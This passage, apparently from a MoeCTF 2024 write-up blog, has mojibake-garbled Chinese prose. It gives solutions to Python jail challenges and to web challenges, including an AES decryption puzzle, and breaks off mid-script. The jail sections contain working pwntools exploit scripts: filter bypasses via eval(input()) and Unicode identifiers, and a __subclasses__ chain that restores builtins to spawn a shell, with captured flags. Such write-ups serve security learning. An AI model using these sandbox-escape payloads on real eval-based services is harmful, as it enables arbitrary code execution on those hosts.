<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;[&#34;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">0-8bdhosxy_]|[^\x00-\xff]&#39;</span>, code): print(<span style="color:#e6db74">&#34;Nope&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(code) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">15</span>: print(<span style="color:#e6db74">&#34;Too long&#34;</span>)
</span></span></code></pre></div><p>å®¹æ˜“æƒ³åˆ° <code>eval(input())</code> æ¥ç»•è¿‡é™åˆ¶ï¼Œä¹‹åå°±æ˜¯æ‰¾flagï¼Œä¾æ—§åœ¨/tmpç›®å½•ä¸‹ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Give me your code: eval<span style="color:#f92672">(</span>input<span style="color:#f92672">())</span>
</span></span><span style="display:flex;"><span>__import__<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;os&#39;</span><span style="color:#f92672">)</span>.system<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;cat /tmp/the*&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>moectf<span style="color:#f92672">{</span>50mEtlMeS-InpuT_CaN_be_A-M3tHOD_TO_BypAss_fIIt3rs0<span style="color:#f92672">}</span>
</span></span></code></pre></div><hr>
<h2 id="moejail_lv3">moejail_lv3<a hidden class="anchor" aria-hidden="true" href="#moejail_lv3">#</a></h2>
<pre tabindex="0"><code>if re.search(r&#34;[A-z0-9]&#34;, code): print(&#34;Nope&#34;)
</code></pre><p>ç”¨unicodeå­—ç¬¦æ¥ç»•è¿‡å³å¯ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>unicode_chr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ğŸğŸğŸğŸ‘ğŸ’ğŸ“ğŸ”ğŸ•ğŸ–ğŸ—ğ˜¢ğ˜£ğ˜¤ğ˜¥ğ˜¦ğ˜§ğ˜¨ğ˜©ğ˜ªğ˜«ğ˜¬ğ˜­ğ˜®ğ˜¯ğ˜°ğ˜±ğ˜²ğ˜³ğ˜´ğ˜µğ˜¶ğ˜·ğ˜¸ğ˜¹ğ˜ºğ˜»ğ˜ˆğ˜‰ğ˜Šğ˜‹ğ˜Œğ˜ğ˜ğ˜ğ˜ğ˜‘ğ˜’ğ˜”ğ˜•ğ˜–ğ˜—ğ˜˜ğ˜™ğ˜šğ˜›ğ˜œğ˜ğ˜ğ˜Ÿğ˜ ğ˜¡ï¼¿&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ğ˜¦ğ˜·ğ˜¢ğ˜­(ğ˜ªğ˜¯ğ˜±ğ˜¶ğ˜µ())</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ğ˜¦ğ˜·ğ˜¢ğ˜­(ğ˜ªğ˜¯ğ˜±ğ˜¶ğ˜µ())&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,<span style="color:#ae81ff">30179</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Please enter &#39;&#34;</span>)
</span></span><span style="display:flex;"><span>cha1 <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#39;+&#39;&#34;</span>)
</span></span><span style="display:flex;"><span>cha2 <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>cha <span style="color:#f92672">=</span> cha1 <span style="color:#f92672">+</span> cha2
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(cha<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Give me your code:&#34;</span>,exp<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>ä¹‹åæ­£å¸¸åœ¨/tmpç›®å½•ä¸‹æ‰¾flagï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>__import__<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;os&#39;</span><span style="color:#f92672">)</span>.system<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;cat /tmp/the*&#39;</span><span style="color:#f92672">)</span> 
</span></span><span style="display:flex;"><span>moectf<span style="color:#f92672">{</span>peP-aIloW_yOU_use-uN1coD3_cHar_A5-A5Ci1_onEs0<span style="color:#f92672">}</span>
</span></span></code></pre></div><hr>
<h2 id="moejail_lv4">moejail_lv4<a hidden class="anchor" aria-hidden="true" href="#moejail_lv4">#</a></h2>
<pre tabindex="0"><code>Hint: eval(code, {&#34;__builtins__&#34;: {&#34;eval&#34;: lambda *x: print(&#34;sry, no eval for u&#34;)},},{},)
</code></pre><p>æ‰§è¡Œevalçš„ç¯å¢ƒæŠŠæ‰€æœ‰å†…ç½®å‡½æ•°éƒ½åˆ æ‰äº†ï¼Œåªç•™äº†ä¸ªæ”¹è¿‡çš„evalå‡½æ•°ï¼Œå…·ä½“å°±æ˜¯å¦‚æœcodeé‡Œæƒ³è¦æ‰§è¡Œ <code>eval()</code> ï¼Œæ— è®ºæ‹¬å·é‡Œæ˜¯ä»€ä¹ˆï¼Œéƒ½ä¼š <code>print(&quot;sry, no eval for u&quot;)</code></p>
<p>å¯ä»¥é€šè¿‡é­”æœ¯æ–¹æ³•é‡æ–°è·å– <code>__builtins __</code> æ¨¡å—ï¼Œæ„é€ å¦‚ä¸‹å½¢å¼çš„ç»§æ‰¿é“¾ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[{}]<span style="color:#f92672">.</span><span style="color:#a6e22e">__init__</span><span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#34;__builtins__&#34;</span>][<span style="color:#e6db74">&#34;__import__&#34;</span>](<span style="color:#e6db74">&#34;os&#34;</span>)<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;whoami&#34;</span>)<span style="color:#e6db74">&#39;.format(i)</span>
</span></span></code></pre></div><p>ç”±äºevalä¸ä¼šè¿”å› <code>().__class__.__base__.__subclasses__()</code> çš„ç»“æœï¼Œæ‰€ä»¥è€ƒè™‘çˆ†ç ´ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">verify</span>():
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Please enter &#39;&#34;</span>)
</span></span><span style="display:flex;"><span>    cha1 <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#39;+&#39;&#34;</span>)
</span></span><span style="display:flex;"><span>    cha2 <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>    cha <span style="color:#f92672">=</span> cha1 <span style="color:#f92672">+</span> cha2
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(cha<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp</span>(i):
</span></span><span style="display:flex;"><span>    exp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;().__class__.__base__.__subclasses__()[</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">].__init__.__globals__[&#34;__builtins__&#34;][&#34;__import__&#34;](&#34;os&#34;).system(&#34;ls /&#34;)&#39;</span><span style="color:#f92672">.</span>format(i)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> exp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,<span style="color:#ae81ff">1086</span>)
</span></span><span style="display:flex;"><span>verify()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">159</span>):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Give me your code:&#34;</span>,exp(i)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>    verify()
</span></span><span style="display:flex;"><span>    print(i,res)
</span></span></code></pre></div><p>è¿è¡Œç»“æœä¸­æœ‰ä¸€äº›æ˜¯æˆåŠŸæ‰§è¡Œ <code>whoami</code> çš„ï¼Œæ¯”å¦‚æœ€åå‡ ä¸ªï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#ae81ff">154</span>  nobody
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155</span>  nobody
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">156</span>  nobody
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">157</span>  ğŸ¤” Error: <span style="color:#e6db74">&#39;wrapper_descriptor&#39;</span> object has no attribute <span style="color:#e6db74">&#39;__globals__&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">158</span>  nobody
</span></span></code></pre></div><p>ä¹‹åå°±æ˜¯æ‹¿shellæ‰¾flagï¼Œç»™å‡ºå®Œæ•´expï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">verify</span>():
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Please enter &#39;&#34;</span>)
</span></span><span style="display:flex;"><span>    cha1 <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#39;+&#39;&#34;</span>)
</span></span><span style="display:flex;"><span>    cha2 <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>    cha <span style="color:#f92672">=</span> cha1 <span style="color:#f92672">+</span> cha2
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(cha<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">def exp(i):
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    exp = &#39;().__class__.__base__.__subclasses__()[</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">].__init__.__globals__[&#34;__builtins__&#34;][&#34;__import__&#34;](&#34;os&#34;).system(&#34;ls /&#34;)&#39;.format(i)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    return exp
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">p = remote(&#34;127.0.0.1&#34;,1086)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">verify()
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">for i in range(159):
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    p.sendlineafter(b&#34;Give me your code:&#34;,exp(i).encode())
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    res = p.recvline().decode()
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    verify()
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    print(i,res)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,<span style="color:#ae81ff">1086</span>)
</span></span><span style="display:flex;"><span>verify()
</span></span><span style="display:flex;"><span>exp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;().__class__.__base__.__subclasses__()[158].__init__.__globals__[&#34;__builtins__&#34;][&#34;__import__&#34;](&#34;os&#34;).system(&#34;sh&#34;)&#39;</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Give me your code:&#34;</span>,exp<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ls /tmp
</span></span><span style="display:flex;"><span>therealflag_4e9e98cbe32a98ead5ed47dd59b3b238
</span></span><span style="display:flex;"><span>cat /tmp/t*
</span></span><span style="display:flex;"><span>moectf<span style="color:#f92672">{</span>YoU-c4n_reCoveR_Glob4l5-@ND_6UI1tInS-FR0M-cuST0M_functions0<span style="color:#f92672">}</span>
</span></span></code></pre></div><hr>
<h2 id="webæ¸—é€æµ‹è¯•ä¸å®¡è®¡å…¥é—¨æŒ‡åŒ—">Webæ¸—é€æµ‹è¯•ä¸å®¡è®¡å…¥é—¨æŒ‡åŒ—<a hidden class="anchor" aria-hidden="true" href="#webæ¸—é€æµ‹è¯•ä¸å®¡è®¡å…¥é—¨æŒ‡åŒ—">#</a></h2>
<p>æœ¬åœ°ç”¨phpstudyèµ·ä¸€ä¸ªç½‘ç«™å³å¯ï¼š</p>
<p><img loading="lazy" src="/images/MoeCTF2024/WEB/1.png"></p>
<p>æˆ–è€…ç›´æ¥åˆ†æ <code>index.php</code> å’Œ <code>script.php</code> ï¼Œæ‰¾å‡ºåŠ å¯†æ–¹å¼ï¼Œèƒ½çœ‹åˆ°phpé‡Œç»™å‡ºäº†ciphertextå’Œkeyï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>$data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;ciphertext&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;F8NX+bX/AAT5oTosfY7JpiQ1oQM0onbI/41oFG9khFMr68qBn8ZlPia8XhrLSMFo&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;key&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;1234567891011121&#34;</span>
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">json_encode</span>($data);
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>å†å…³æ³¨htmlä¸­çš„bodyéƒ¨åˆ†ï¼Œèƒ½çœ‹åˆ°è¿›è¡Œäº†base64_deocde + AES-CBCçš„æ“ä½œï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;title&#34;</span>&gt;Welcome to Moectf&lt;/<span style="color:#f92672">h1</span>&gt;
</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;xt&#34;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;script.php&#39;</span>)
</span></span><span style="display:flex;"><span>            .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">response</span> =&gt; <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">json</span>())
</span></span><span style="display:flex;"><span>            .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> =&gt; {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ciphertext</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">ciphertext</span>;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">CryptoJS</span>.<span style="color:#a6e22e">enc</span>.<span style="color:#a6e22e">Utf8</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">key</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">iv</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">CryptoJS</span>.<span style="color:#a6e22e">enc</span>.<span style="color:#a6e22e">Utf8</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#e6db74">&#34;17829693&#34;</span>);
</span></span><span style="display:flex;"><span>                
</span></span><span style="display:flex;"><span>                
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">decodedCiphertext</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">CryptoJS</span>.<span style="color:#a6e22e">enc</span>.<span style="color:#a6e22e">Base64</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">ciphertext</span>);
</span></span><span style="display:flex;"><span>                
</span></span><span style="display:flex;"><span>                
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">decrypted</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">CryptoJS</span>.<span style="color:#a6e22e">AES</span>.<span style="color:#a6e22e">decrypt</span>({ <span style="color:#a6e22e">ciphertext</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">decodedCiphertext</span> }, <span style="color:#a6e22e">key</span>, {
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">iv</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">iv</span>,
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">CryptoJS</span>.<span style="color:#a6e22e">mode</span>.<span style="color:#a6e22e">CBC</span>,
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">padding</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">CryptoJS</span>.<span style="color:#a6e22e">pad</span>.<span style="color:#a6e22e">Pkcs7</span>
</span></span><span style="display:flex;"><span>                });
</span></span><span style="display:flex;"><span>                
</span></span><span style="display:flex;"><span>                
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">plaintext</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">decrypted</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#a6e22e">CryptoJS</span>.<span style="color:#a6e22e">enc</span>.<span style="color:#a6e22e">Utf8</span>);
</span></span><span style="display:flex;"><span>                
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;xt&#39;</span>).<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;p&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">plaintext</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&lt;/p&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>            })
</span></span><span style="display:flex;"><span>            .<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">error</span> =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;Error:&#39;</span>, <span style="color:#a6e22e">error</span>));
</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
</span></span></code></pre></div><p>cyberchefè§£ä¸€ä¸‹ä¹Ÿèƒ½æ‹¿åˆ°flagï¼Œæ³¨æ„ivä¸è¶³16å­—èŠ‚ï¼Œå¡«\x00è¡¥é½å³å¯ï¼š</p>
<p><img loading="lazy" src="/images/MoeCTF2024/WEB/2.png"></p>
<hr>
<h2 id="å‹‡é—¯é“œäººé˜µ">å‹‡é—¯é“œäººé˜µ<a hidden class="anchor" aria-hidden="true" href="#å‹‡é—¯é“œäººé˜µ">#</a></h2>
<p>è¦æ±‚5æ¬¡æ­£ç¡®å›ç­”é—®é¢˜ï¼Œå¹¶ä¸”æ ¹æ®é—®é¢˜ï¼Œä¼šæœ‰ä¸¤ç§ç±»å‹çš„å›ç­”ï¼Œå¯ä»¥å…ˆæŠ“åŒ…çœ‹ä¸€ä¸‹ä¼ å‚ç±»å‹ï¼š</p>
<p><img loading="lazy" src="/images/MoeCTF2024/WEB/3.png"></p>
<p>å‘ç°æ˜¯POSTä¼ å‚ä»¥åŠå¯¹åº”é—®é¢˜ä½ç½®ï¼Œå†™ä¸ªè„šæœ¬æ³¨æ„ä¿æŒä¼šè¯å³å¯ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>position_mapping <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;1&#34;</span>:<span style="color:#e6db74">&#34;åŒ—æ–¹&#34;</span>,<span style="color:#e6db74">&#34;2&#34;</span>:<span style="color:#e6db74">&#34;ä¸œåŒ—æ–¹&#34;</span>,<span style="color:#e6db74">&#34;3&#34;</span>:<span style="color:#e6db74">&#34;ä¸œæ–¹&#34;</span>,<span style="color:#e6db74">&#34;4&#34;</span>:<span style="color:#e6db74">&#34;ä¸œå—æ–¹&#34;</span>,<span style="color:#e6db74">&#34;5&#34;</span>:<span style="color:#e6db74">&#34;å—æ–¹&#34;</span>,<span style="color:#e6db74">&#34;6&#34;</span>:<span style="color:#e6db74">&#34;è¥¿å—æ–¹&#34;</span>,<span style="color:#e6db74">&#34;7&#34;</span>:<span style="color:#e6db74">&#34;è¥¿æ–¹&#34;</span>,<span style="color:#e6db74">&#34;8&#34;</span>:<span style="color:#e6db74">&#34;è¥¿åŒ—æ–¹&#34;</span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>():
</span></span><span style="display:flex;"><span>    start <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;player&#34;</span>: <span style="color:#e6db74">&#34;w8nn9z&#34;</span>, <span style="color:#e6db74">&#34;direct&#34;</span>: <span style="color:#e6db74">&#34;å¼Ÿå­æ˜ç™½&#34;</span>}
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(url,data<span style="color:#f92672">=</span>start)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> res
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">num</span>(res):
</span></span><span style="display:flex;"><span>    pattern1 <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;id=&#34;status&#34;&gt;\s*.*\s*&lt;/&#39;</span>)
</span></span><span style="display:flex;"><span>    message <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(pattern1,res)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    pattern2 <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;\d+&#39;</span>)
</span></span><span style="display:flex;"><span>    num <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(pattern2,message)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> num
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sol</span>(res):
</span></span><span style="display:flex;"><span>    num_list <span style="color:#f92672">=</span> num(res<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(num_list) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>        req <span style="color:#f92672">=</span> position_mapping[str(num_list[<span style="color:#ae81ff">0</span>])]
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(url,data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;player&#34;</span>: <span style="color:#e6db74">&#34;w8nn9z&#34;</span>, <span style="color:#e6db74">&#34;direct&#34;</span>: req})
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        req <span style="color:#f92672">=</span> position_mapping[str(num_list[<span style="color:#ae81ff">0</span>])] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;ä¸€ä¸ª&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;ï¼Œ&#34;</span> <span style="color:#f92672">+</span> position_mapping[str(num_list[<span style="color:#ae81ff">1</span>])] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;ä¸€ä¸ª&#34;</span>
